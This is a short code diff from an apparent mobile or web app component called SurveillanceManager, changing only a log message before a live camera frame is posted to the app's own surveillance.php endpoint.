@@ -97,7 +97,7 @@ export function SurveillanceManager() {
           name: `live_${targetId}.jpg`,
         } as any);
 
-        console.log(`Sending Live Frame: ${photo.width}x${photo.height}`);
+        console.log(`Sending Live Frame: ${photo.width}x${photo.height} via Binary FormData...`);
 
         const response = await fetch(`${API_URL}/api/surveillance.php`, {
           method: 'POST',
